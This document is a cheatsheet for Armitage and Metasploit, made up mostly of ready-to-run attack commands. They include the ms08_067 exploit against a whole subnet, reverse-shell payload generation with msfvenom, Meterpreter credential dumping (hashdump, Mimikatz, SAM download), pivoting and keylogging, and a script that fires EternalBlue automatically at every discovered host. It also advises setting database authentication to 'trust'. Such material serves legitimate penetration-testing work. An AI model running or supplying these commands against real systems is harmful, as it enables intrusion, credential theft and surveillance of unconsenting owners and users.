# Armitage Cheatsheet

## Quick Start

```bash
# Launch Armitage (auto-starts msfrpcd)
sudo armitage

# Launch teamserver (multi-user)
sudo teamserver 192.168.1.202 s3cr3t

# Launch msfrpcd manually
sudo msfrpcd -f -U msf -P msf -S -p 55553
```

## Connection

| Field | Default | Description |
|---|---|---|
| Host | 127.0.0.1 | msfrpcd address |
| Port | 55553 | RPC port |
| User | msf | Username |
| Password | msf | Password |

## GUI Workflow

1. **Discover hosts:** Hosts → Nmap Scan → Quick Scan / Intense Scan
2. **Exploit host:** Right-click host → Attack → select exploit
3. **Interact session:** Sessions → Interact (opens Meterpreter/shell)
4. **View credentials:** View → Credentials
5. **Manage teams:** Armitage → Set Teamserver (for collaboration)

## Essential Metasploit Commands (Console Tab)

```bash
# Database operations
db_nmap -sV 192.168.1.0/24          # Scan and store results
hosts -c address,os_name,purpose     # List all hosts
services -c port,name -S smb         # Filter services
creds                                 # Show credentials
loot                                 # Show loot files

# Exploitation
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.1.0/24
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit -j                            # Background job

# Multi-handler
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit -j

# Payload generation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o /tmp/shell.exe
```

## Meterpreter Commands

```bash
sysinfo                              # System info
getuid                               # Current user
getsystem                            # Escalate to SYSTEM
hashdump                             # Dump NTLM hashes
load kiwi                            # Load Mimikatz extension
creds_all                            # Dump all credentials
upload /tmp/file.exe C:\\Users\\Public\\
download C:\\Windows\\System32\\config\\SAM /tmp/
portfwd add -l 3389 -p 3389 -r 192.168.1.100   # Port forward
run autoroute -s 172.16.0.0/24       # Route through pivot
migrate 1234                         # Migrate to PID
shell                                # Drop to system shell
keyscan_start                        # Start keylogger
keyscan_dump                         # Dump captured keys
```

## Cortana Scripting

```bash
# Auto-exploit on host discovery
on host {
    println("New host: " . $1);
    launch('exploit/windows/smb/ms17_010_eternalblue', $1, "445");
}

# Load script in Armitage: Script Manager → Load
```

## Teamserver Collaboration

```bash
# Team lead starts server
sudo teamserver 10.0.0.1 s3cr3tP@ss

# Operators connect
# File → Connect → Host: 10.0.0.1, Port: 55553
# Use "Steal Session" to take ownership of sessions
```

## Troubleshooting

```bash
# Java version fix
sudo apt install openjdk-11-jdk
sudo update-alternatives --config java

# PostgreSQL auth fix
# Edit /etc/postgresql/*/main/pg_hba.conf
# Change "scram-sha-256" to "trust" for local connections
sudo systemctl restart postgresql

# Check msfrpcd is running
sudo netstat -tlnp | grep 55553

# Test RPC connection
curl -k https://127.0.0.1:55553/api/1.0/auth/login -d "username=msf&password=msf"
```

## Key Shortcuts

| Action | Menu Path |
|---|---|
| New scan | Hosts → Nmap Scan |
| Import hosts | Hosts → Import |
| Hail Mary (auto-exploit) | Attacks → Hail Mary |
| View all sessions | Sessions → List All |
| Export report | Hosts → Export |
| Load Cortana script | Script Manager → Load |
| Disconnect | File → Disconnect |
